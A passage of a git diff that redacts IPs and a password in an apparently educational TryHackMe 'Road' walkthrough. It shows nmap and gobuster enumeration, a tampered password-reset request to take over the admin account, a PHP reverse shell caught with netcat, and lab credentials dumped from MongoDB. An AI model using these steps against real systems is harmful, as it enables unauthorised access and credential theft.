@@ -5,9 +5,9 @@ Room link: https://tryhackme.com/room/road
 # Scanning 
 I first conducted a scan using nmap with the ```-A``` option. 
 ```
-ajread@aj-ubuntu:~/TryHackMe/practice$ nmap -A -Pn 10.10.112.94
+ajread@aj-ubuntu:~/TryHackMe/practice$ nmap -A -Pn [REDACTED]
 Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-24 20:39 EST
-Nmap scan report for 10.10.112.94
+Nmap scan report for [REDACTED]
 Host is up (0.093s latency).
 Not shown: 998 closed ports
 PORT   STATE SERVICE VERSION
@@ -23,13 +23,13 @@ Nmap done: 1 IP address (1 host up) scanned in 21.43 seconds
 # Enumeration
 I did some enumeration of the http service using both nikto and gobuster.
 ```
-ajread@aj-ubuntu:~/TryHackMe$ gobuster -u http://10.10.112.94 -w /home/ajread/resources/wordlists/SecLists/Discovery/Web-Content/common.txt 
+ajread@aj-ubuntu:~/TryHackMe$ gobuster -u http://[REDACTED] -w /home/ajread/resources/wordlists/SecLists/Discovery/Web-Content/common.txt 
 
 =====================================================
 Gobuster v2.0.1              OJ Reeves (@TheColonial)
 =====================================================
 [+] Mode         : dir
-[+] Url/Domain   : http://10.10.112.94/
+[+] Url/Domain   : http://[REDACTED]/
 [+] Threads      : 10
 [+] Wordlist     : /home/ajread/resources/wordlists/SecLists/Discovery/Web-Content/common.txt
 [+] Status codes : 200,204,301,302,307,403
@@ -98,15 +98,15 @@ Submit
 Therefore, I can change the ```uname``` form-data to be ```admin@sky.thm```. 
 ```
 POST /v2/lostpassword.php HTTP/1.1
-Host: 10.10.131.37
+Host: [REDACTED]
 Content-Length: 540
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
-Origin: http://10.10.131.37
+Origin: http://[REDACTED]
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxdvYN3WHUb0ERBBw
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://10.10.131.37/v2/ResetUser.php
+Referer: http://[REDACTED]/v2/ResetUser.php
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
 Cookie: PHPSESSID=o4uhk2qg369vgql7s0lebn91cj; Bookings=0; Manifest=0; Pickup=0; Delivered=0; Delay=0; CODINR=0; POD=0; cu=0
@@ -149,13 +149,13 @@ ajread@aj-ubuntu:~/TryHackMe$ nc -lnvp 9999
 ```
 And curl'd the location where the images are stored to execute the reverse shell. 
 ```
-ajread@aj-ubuntu:~/TryHackMe$ curl http://10.10.131.37/v2/profileimages/php-reverse-shell.php
+ajread@aj-ubuntu:~/TryHackMe$ curl http://[REDACTED]/v2/profileimages/php-reverse-shell.php
 ```
 I got a shell! 
 ```
 ajread@aj-ubuntu:~/TryHackMe$ nc -lnvp 9999
 Listening on 0.0.0.0 9999
-Connection received on 10.10.131.37 54696
+Connection received on [REDACTED] 54696
 Linux sky 5.4.0-73-generic #82-Ubuntu SMP Wed Apr 14 17:39:42 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
  00:34:20 up 26 min,  0 users,  load average: 0.00, 0.02, 0.21
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
@@ -192,7 +192,7 @@ user
 db.user.find()
 { "_id" : ObjectId("60ae2661203d21857b184a76"), "Month" : "Feb", "Profit" : "25000" }
 { "_id" : ObjectId("60ae2677203d21857b184a77"), "Month" : "March", "Profit" : "5000" }
-{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "BahamasChapp123!@#" }
+{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "[REDACTED]" }
 { "_id" : ObjectId("60ae26bf203d21857b184a79"), "Name" : "Rohit", "EndDate" : "December" }
 { "_id" : ObjectId("60ae26d2203d21857b184a7a"), "Name" : "Rohit", "Salary" : "30000" }
 ```
@@ -255,5 +255,4 @@ Authenticating as: webdeveloper
 Password: 
 ==== AUTHENTICATION COMPLETE ===
 ```
-
 Writeup done with the help of: ```https://wiki.thehacker.nz/docs/thm-writeups/road-medium/```. 
